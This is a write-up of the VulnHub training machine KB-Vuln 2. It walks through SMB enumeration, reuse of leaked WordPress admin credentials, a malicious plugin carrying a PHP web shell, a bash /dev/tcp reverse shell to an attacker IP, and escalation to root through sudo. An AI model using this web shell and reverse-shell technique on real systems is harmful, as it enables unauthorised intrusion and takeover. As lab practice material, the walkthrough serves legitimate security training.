# KB-VULN 2  | Vuln-Hub | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [KB-Vuln 2](https://www.vulnhub.com/entry/kb-vuln-2,562/)    |
| Difficulty        | Easy                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             | Nmap, Dirb, SMBClient, FTP, WordPress, Netcat |

# Reconnaissance

Identify the target machine on the local network.
```
arp -a 
```

[arp scan](../Vulnhub/images/KB-vuln2/arp-scan.png)

Once the target IP was identified, perform an nmap scan to enumerate the available services<br>
`nmap -A -T4 <ip address>`

[nmap scan](../Vulnhub/images/KB-vuln2/nmap-scan.png)

| Port      | Service       |
| --------- |---------------|
| 21/tcp    | ftp           |
| 22/tcp    | ssh           |
| 80/tcp    | http          |
| 139/tcp   | Netbios       |
| 445/tcp   | SMB           |

# Enumeration 

## Website Enumeration

Browsing to the target IP displayed only the default Apache page.
```
http://10.0.2.11
```

This suggested that the actual web application might be located in a subdirectory or configured as a virtual host.

A directory enumeration scan was performed using Dirb.
```
dirb http://10.0.2.11
```

Among the discovered directories was a WordPress installation.

While browsing the WordPress site, it referenced the domain:`kb.vuln` <br>
Since this hostname could not be resolved by DNS, it was added to the attack machine's `/etc/hosts` file.
```
10.0.2.11    kb.vuln
```

After adding the hostname, browsing to: `http://kb.vuln` loaded the website correctly with its CSS, images, and full functionality.<br>

## SMB Enumeration

The next step was to enumerate the SMB shares.

Listing the available shares revealed an share named `anonymous `.
```
smbclient -L //10.0.2.11 -N
```

[SMB Shared](../Vulnhub/images/KB-vuln2/smb-shares.png)

Connecting to the share revealed a backup archive `backup.zip`<br>
After downloading and extracting the archive, it contained a file named:`remember_me.txt` 

[backup.zip](../Vulnhub/images/KB-vuln2/backup_zip.png)

[remember_me](../Vulnhub/images/KB-vuln2/remember_me.png)

The file contained valid credentials.
```
Username: admin
Password: MachineBoy141
```

# Exploitation

Using the credentials obtained from the SMB share, the WordPress login was successful.

# Initial Access

Since administrative access to WordPress was available, the next objective is to obtain remote code execution.<br>

A custom malicious WordPress plugin was created containing a simple PHP web shell.

[payload](../Vulnhub/images/KB-vuln2/payload.png)

The plugin was compressed into a ZIP archive and uploaded through:

```
Plugins → Add New → Upload Plugin
```

After activating the plugin, arbitrary command execution was verified.

```
http://kb.vuln/wordpress/wp-content/plugins/shell/shell.php?cmd=id
```

The response confirmed successful command execution.

## Reverse Shell

A Netcat listener was started on the attacking machine.
```
nc -lvnp 4444
```

The web shell was then used to execute a Bash reverse shell.

```
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'

Note: URL-encode the payload
```

This returned a shell as:`www-data`

[reverse shell](../Vulnhub/images/KB-vuln2/reverse-shell.png)

# Privilege Escalation

Basic enumeration identified another local user.
```
ls /home
kbadmin
```

Inspecting the web root also revealed a README file indicating that kbadmin was the system administrator.

The kbadmin home directory was accessible, allowing the user flag to be retrieved.

Alongside the user flag was a note containing the hint:`USE docker!`

To determine the privileges assigned to the user, the account information was inspected `id kbadmin` <br>

The output showed that kbadmin belonged to several privileged groups, including:
```
sudo
docker
lxd
```

Although the hint suggested exploiting Docker, further investigation revealed a simpler privilege escalation path.<br>

After upgrading the shell to obtain a proper TTY, the credentials recovered during enumeration were used to switch to the kbadmin account.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
su kbadmin
Password: MachineBoy141
```

Checking the user's sudo privileges showed unrestricted administrative access.
```
sudo -l
Output:

User kbadmin may run the following commands on kb-server:
    (ALL : ALL) ALL
```

Since the user had full sudo permissions, obtaining root was straightforward.
```
sudo su 
MachineBoy141
```

This resulted in a fully privileged root shell.<br>
[Root Access](../Vulnhub/images/KB-vuln2/root-access.png)

[User Flag](../Vulnhub/images/KB-vuln2/user-flag.png)

[Root Flag](../Vulnhub/images/KB-vuln2/root-flag.png)


Root flag & User Flag found!<br>
I hope this walkthrough was clear, informative, and easy to follow.<br>

Happy Hacking ~!!!